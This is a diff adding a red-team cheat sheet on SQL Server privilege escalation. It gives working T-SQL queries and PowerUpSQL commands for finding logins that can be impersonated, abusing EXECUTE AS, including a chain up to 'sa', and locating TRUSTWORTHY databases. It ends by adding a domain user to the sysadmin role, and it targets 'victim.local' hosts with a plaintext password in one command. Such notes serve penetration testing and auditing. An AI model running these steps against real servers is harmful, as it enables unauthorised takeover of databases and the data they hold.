@@ -1,0 +1,72 @@
+PRIVILEGE ESCALATION
+User Impersonation (EXECUTE AS) 
+
+Find SQL Server logins which can be impersonated in the current database:
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+
+User Impersonation (EXECUTE AS) (PowerUpSQL)
+
+Find logins which can be impersonated Invoke-SQLAuditPrivImpersonateLogin -Username sqladmin Password PASSw0rd123 -Instance ops-mssql -Verbose
+
+User Impersonation (EXECUTE AS) 
+
+Exploiting impersonation 
+
+SELECT SYSTEM_USER 
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+EXECUTE AS LOGIN = 'dbadmin' 
+SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') 
+SELECT ORIGINAL_LOGIN()
+
+User Impersonation (EXECUTE AS) (PowerUpSQL) 
+
+Exploiting impersonation (note the difficulty in automating the abuse of chained/nested impersonation) 
+
+Invoke-SQLAuditPrivImpersonateLogin -Instance sqlserver01.victim.local –Exploit -Verbose
+
+User Impersonation (EXECUTE AS) 
+
+Exploiting chained/nested impersonation 
+
+SELECT SYSTEM_USER 
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+EXECUTE AS LOGIN = 'dbadmin' 
+SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') 
+SELECT ORIGINAL_LOGIN() EXECUTE AS LOGIN = 'sa' 
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+
+
+TRUSTWORTHY Database 
+
+Look for TRUSTWORTHY database (can be done with public role) 
+
+SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases
+
+
+TRUSTWORTHY Database 
+
+Look for db_owner role (can be done with public role) 
+
+use <database> SELECT DP1.name AS DatabaseRoleName,   isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM  RIGHT OUTER JOIN sys.database_principals AS DP1  ON DRM.role_principal_id = DP1.principal_id  LEFT OUTER JOIN sys.database_principals AS DP2  ON DRM.member_principal_id = DP2.principal_id  WHERE DP1.type = 'R' ORDER BY DP1.name;
+
+
+TRUSTWORTHY Database 
+
+Look for TRUSTWORTHY database using PowerUpSQL 
+
+Invoke-SQLAudit -Instance sqlserver01.victim.local  -Verbose | Out-GridView
+
+Invoke-SQLAuditPrivTrustworthy -Instance sqlserver01 -Verbose
+
+TRUSTWORTHY Database 
+
+EXECUTE AS to elevate privileges 
+
+EXECUTE AS USER = 'dbo' 
+SELECT system_user 
+EXEC sp_addsrvrolemember 'domain\user123','sysadmin'
+
+
